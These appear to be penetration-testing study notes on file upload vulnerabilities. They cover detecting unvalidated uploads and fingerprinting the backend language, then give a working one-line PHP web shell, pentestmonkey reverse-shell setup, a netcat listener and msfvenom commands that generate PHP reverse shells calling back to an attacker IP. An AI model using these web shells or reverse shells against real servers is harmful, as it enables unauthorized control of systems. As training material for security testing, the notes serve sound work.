# File Upload Vulnerability Notes

## Key Concepts on File Upload Vulnerabilities

### 1. **Absent Validation**
   - Web applications may allow uploads without validation filters.
   - Vulnerable applications allow uploading any file type, including potentially malicious files like web shells or reverse shells.
   - Uploading and executing these scripts may provide full control over the server.

### 2. **Arbitrary File Upload**
   - Web apps may allow uploading any file, without specifying restrictions on file types (e.g., `.php` files).
   - The file selector dialog may show "All Files," indicating no restrictions are enforced on the frontend.
   - If backend validation is absent, it may allow arbitrary file types to be uploaded, leading to potential server exploitation.

### 3. **Identifying Web Framework**
   - To exploit arbitrary file upload, we need to know the server's scripting language.
   - **Web Shell** and **Reverse Shell** scripts require knowing the language of the web server (e.g., PHP, ASP).
   - The **file extension** in URLs can provide clues (e.g., `.php` might indicate PHP backend), though sometimes file extensions may be hidden due to `web routes`
> Web routes are instructions in a web application that map specific URLs to corresponding actions or pages, determining what content or functionality is shown when a user visits a particular address.

   - Testing common web extensions (e.g., `/index.php`) can help identify the technology.
   - Tools like **Burp Intruder** can automate this process by fuzzing extensions.
   - `Wappalyzer` browser extension helps identify the technologies in use on the site.

### 4. **Vulnerability Identification**
   - Once the backend language is identified, you can upload a file in the same language (e.g., a PHP script).
   - Testing with a basic PHP script like `<?php echo "Hello HTB"; ?>` helps confirm if the uploaded file can execute PHP code.
   - If the file is successfully uploaded and executed, the server is vulnerable to file upload exploitation.
   - Example test: Upload `test.php` and access the uploaded file. If the PHP code is executed, the server is vulnerable.

### 5. **Exploiting the Vulnerability**
   - After confirming file upload vulnerability, the next step is to exploit it for remote control of the server by uploading a malicious script.

## Exploitation Techniques

### Web Shells
   - Web shells are scripts that provide a way to interact with the backend server.
   - Examples include **phpbash**, a terminal-like PHP web shell, and others available in **SecLists**.
   - Upload the web shell through the vulnerable upload feature and access it via its link:
     ```
     http://SERVER_IP:PORT/uploads/phpbash.php
     ```
   - Custom Web Shell Example:
     ```php
     <?php system($_REQUEST['cmd']); ?>
     ```
     - Use the `?cmd=` parameter to execute commands (e.g., `?cmd=id`).
     - For browsers, use source-view (`Ctrl+U`) for better output formatting.

### Reverse Shells
   - Reverse shells allow the server to connect back to the attacker's machine, providing interactive control.
   - Tools like **pentestmonkey PHP reverse shell** or scripts from **SecLists** can be used.
   - Edit the script with your IP/PORT:
     ```php
     $ip = 'OUR_IP';     // CHANGE THIS
     $port = OUR_PORT;   // CHANGE THIS
     ```
   - Start a Netcat listener:
     ```
     nc -lvnp OUR_PORT
     ```
   - Upload the script and execute it via the web app:
     ```
     http://SERVER_IP:PORT/uploads/reverse.php
     ```
   - Example reverse shell generation with `msfvenom`:
     ```
     msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
     ```

### Writing Custom Scripts
   - Custom scripts can be written in the web server's language using native functions like `system()` in PHP or `eval()` in ASP.NET.
   - Use `msfvenom` for generating scripts for various languages:
     ```
     msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > shell.ext
     ```

## Tools Overview

### Pentestmonkey
   - **What It Is**: A collection of tools and scripts designed for penetration testing, including reliable reverse shells.
   - **Key Usage**:
     - Edit `php-reverse-shell.php` to include your IP and port.
     - Upload to the vulnerable server and access its link to gain shell access.

### Msfvenom
   - **What It Is**: A Metasploit tool used to generate payloads, including reverse and bind shells, for various platforms and languages.
   - **Key Usage**:
     - Syntax:
       ```
       msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > outputfile
       ```
     - Example for PHP:
       ```
       msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw > reverse.php
       ```
     - Payloads and formats:
       - `-p`: Specify the payload (e.g., `php/reverse_php`).
       - `-f`: Format (e.g., `raw`, `exe`, `elf`).

